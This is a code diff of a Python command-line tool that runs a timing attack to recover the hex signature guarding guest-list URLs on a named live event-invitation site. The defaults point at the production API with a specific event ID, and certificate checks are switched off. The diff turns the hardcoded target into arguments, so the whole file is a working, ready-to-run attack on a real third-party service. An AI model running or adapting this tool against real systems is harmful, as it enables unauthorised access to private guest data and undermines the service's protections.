@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import requests, time, logging, csv, operator
+import argparse, requests, time, logging, csv, operator
 from collections import defaultdict
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
@@ -8,19 +8,23 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 logging.basicConfig()
 logger = logging.getLogger('logger')
-logger.setLevel(logging.DEBUG)
+
 
 # input_attack_endpoint = 'https://local.paperlesspost.com/api/v1/guests?event_id={0}-{1}'
 # input_eventid = 19295929
 # input_signature = '7b9c70cf'
 
-input_attack_endpoint = 'https://www.paperlesspost.com/api/v1/guests?event_id={0}-{1}'
-input_eventid = 19295929
-input_signature = '7b9c70cf'
+# input_attack_endpoint = 'https://www.paperlesspost.com/api/v1/guests?event_id={0}-{1}'
+# input_eventid = 19295929
+# input_signature = '7b9c70cf'
+input_signature_seed = None
+input_attack_endpoint = None
+input_eventid = None
+input_iterations = None
 
 SAVE_TO_CSV = False
 
-byte_list = '0123456789abcdef'
+BYTE_LIST = '0123456789abcdef'
 
 def save_to_csv(results, position):
     if results:
@@ -28,10 +32,12 @@ def save_to_csv(results, position):
             writer = csv.writer(f, delimiter=',')
             for row in results:
                 writer.writerow(row)
-            logger.warning("Done Writing")    
+            logger.debug("Done Writing")    
 
 def measure_request(signature, results):
+    logger.debug("Entering measure_request")
     url = input_attack_endpoint.format(input_eventid, signature)
+    logger.debug("Target URL: {0}".format(url))
     # @TODO change to milliseconds
     elapsed_time = requests.get(url, verify=False).elapsed.total_seconds()
     results.append((signature, elapsed_time))
@@ -58,39 +64,43 @@ def determine_byte(position, results):
     for signature, response_times in results_dict.items(): 
         logger.debug("Signature: %s - Elapsed times: %s" % (str(signature), str(response_times)))
         if len(response_times) < 2:
-            raise IndexError('Getting an average requires at least 2 resposne times')   
+            raise IndexError('Getting an average requires at least 2 response times')   
 
-        # compute average for all response times associated with the byte  
         average = sum(response_times) / len(response_times)       
-        # set the average for the signature in a averages dictionary
         averages[signature] = average
     
     logger.debug("Averages for the byte: {0}".format(averages))
 
-    # guess the byte based off the max averages across all posibilities
     guessed_byte = str(max(averages, key=averages.get))[position - 1 : position ]
 
-    logger.debug("Guessed byte: {0}".format(guessed_byte))
+    logger.info("Guessed byte: {0}".format(guessed_byte))
 
-    # clear out averages and results dictionaries
     averages.clear()
     results_dict.clear()
     
     return guessed_byte
 
-def timing_attack(iterations=1):
-    result_sig = ['0','0','0','0','0','0','0','0']
+def timing_attack():
+    logger.debug("Entering timing_attack")
+    logger.debug("\n Iterations: {0} \n signature_seed: {1}".format(input_iterations, input_signature_seed))
+    result_sig = input_signature_seed
     position = 1
     count = 1
     while position < (len(result_sig) + 1):
-        logger.warning("Iterating through bytes at position: {0}".format(position))
+        logger.info("Iterating through bytes at position: {0}".format(position))
         results = []
-        while count <= iterations:
-            for c in byte_list:
+        logger.info("Guessing Signature: {0}".format(''.join(result_sig)))
+        while count <= input_iterations:
+            logger.debug("Count: {0}".format(count))
+            logger.debug("Iterations: {0}".format(input_iterations))
+            logger.debug(count < input_iterations)
+            
+            for c in BYTE_LIST:
                 result_sig[position - 1] = c
                 attack_sig = ''.join(result_sig)
                 measure_request(attack_sig, results)
-            count += 1         
+            count += 1      
+
         if SAVE_TO_CSV:
             save_to_csv(results, position)       
         result_sig[position - 1] = determine_byte(position, results)
@@ -98,18 +108,50 @@ def timing_attack(iterations=1):
         count = 1
     return result_sig
 
-if __name__ == "__main__":
-    logger.warning("Starting timing attack...")
-    iterations = 50
-    logger.warning("The attack will do {0} on each byte.".format(iterations))
+def run_attack():
+    logger.info("Starting timing attack...")
+    logger.info("The attack will do {0} iteration on each byte.".format(input_iterations))
     start = time.time()
-    result = timing_attack(iterations)
-    logger.warning("Guessing the hash is {0}".format(str(result)) )
+    result = timing_attack()
+    logger.info("Guessing the signature is {0}".format(''.join(result)))
     end = time.time()
     elapsed = (end - start)
-    logger.warning("Finished executing attack. Attack took {0} seconds to complete.".format(elapsed) )
+    logger.info("Finished executing attack. Attack took {0} seconds to complete.".format(elapsed) )
 
-        
-        
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Timing attack against event id url signatures.')
+    parser.add_argument('-u', action='store', dest='url', default='https://www.paperlesspost.com/api/v1/guests?event_id={0}-{1}',
+                        help='The target url.')
+    parser.add_argument('-i', action='store', dest='iterations', default='2',
+                        help='The # of iterations to perform per byte. Default is 2.')
+
+    parser.add_argument('-b', action='store', dest='bytes', default='8',
+                        help='The # of bytes to guess. Default is 8.')
+    parser.add_argument('-e', action='store', dest='eventid', default='19295929',
+                        help='The EventID. Default is 19295929.')
+    parser.add_argument('-v', action='store_true', dest='verbose', default=False,
+                        help='Log to console in debug.')                                
+    parser.add_argument('--version', action='version', version='%(prog)s 1.0')
+
+    args = parser.parse_args()
+
+    if args.verbose:
+        logger.setLevel(logging.DEBUG)
+        logger.debug("Logging in debug mode.")
+    else:
+        logger.setLevel(logging.INFO)
+        logger.debug("Logging in info mode.")
+
+    logger.debug("url: {0}".format(args.url))
+    logger.debug("iterations: {0}".format(args.iterations))
+    logger.debug("bytes: {0}".format(args.bytes))
+    logger.debug("event_id: {0}".format(args.eventid))    
+    input_signature_seed = ['0'] * int(args.bytes)
+    logger.debug("Signature_SEED: {0}".format(input_signature_seed))
+    input_eventid = int(args.eventid)
+    input_attack_endpoint = args.url
+    input_iterations = int(args.iterations)
+
+    run_attack()
 
 
